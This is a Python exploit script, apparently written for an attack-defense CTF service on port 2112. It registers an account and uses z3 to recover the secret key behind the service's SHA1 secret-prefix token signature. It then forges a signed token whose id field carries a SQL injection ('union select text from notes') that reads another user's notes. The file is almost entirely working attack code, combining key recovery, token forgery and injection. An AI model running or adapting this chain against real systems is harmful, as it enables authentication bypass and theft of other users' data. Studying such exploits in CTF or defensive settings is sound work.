from checklib import *
from sha1 import Sha1
import struct
from binascii import unhexlify, hexlify
import json
import sys
import z3

HOST = sys.argv[1]
HINT = sys.argv[2]

def main():
    # h = Sha1()
    # h.update(b'a' * 64)
    # h.update(b'{"id": "hui"}')
    # target_values = h.digest_values()
    #
    # h = Sha1()
    #
    # solv = z3.Solver()
    # values = [z3.BitVec(f"v{i}", 32) for i in range(16)]
    # h.update_values(values)
    # h.size += 64
    # h.update(b'{"id": "hui"}')
    # values = h.digest_values()
    #
    # for a, b in zip(values, target_values):
    #     solv.add(a == b)
    # print(solv.check())

    url = f"http://{HOST}:2112"
    session = get_initialized_session()

    username = rnd_username()
    password = rnd_password()

    token = session.post(f"{url}/api/register", json={
        "username": username,
        "password": password,
    }).json()["message"]["token"]

    token_payload, signature = map(unhexlify, token.split("."))


    target_values = struct.unpack(">5I", signature)

    h = Sha1()
    solv = z3.Solver()
    secret_key_values = [z3.BitVec(f"v{i}", 64) for i in range(16)]
    h.update_values(secret_key_values)
    h.size += 64
    h.update(token_payload)
    values = h.digest_values()
    for v in secret_key_values:
        solv.add(0 <= v)
        solv.add(v < 2 ** 32)
    for a, b in zip(values, target_values):
        solv.add(a == b)

    assert solv.check() == z3.sat

    secret_key = struct.pack(">16I", *[solv.model()[v].as_long() for v in secret_key_values])

    assert Sha1(secret_key + token_payload).digest() == signature

    payload = json.dumps({
        "id": f"' union select text from notes where id = '{HINT}"
    }).encode()
    new_token = f"{payload.hex()}.{Sha1(secret_key + payload).digest().hex()}"

    print(session.get(f"{url}/api/notes", headers={
        "Authorization": f"Bearer {new_token}",
    }).json())






if __name__ == "__main__":
    main()
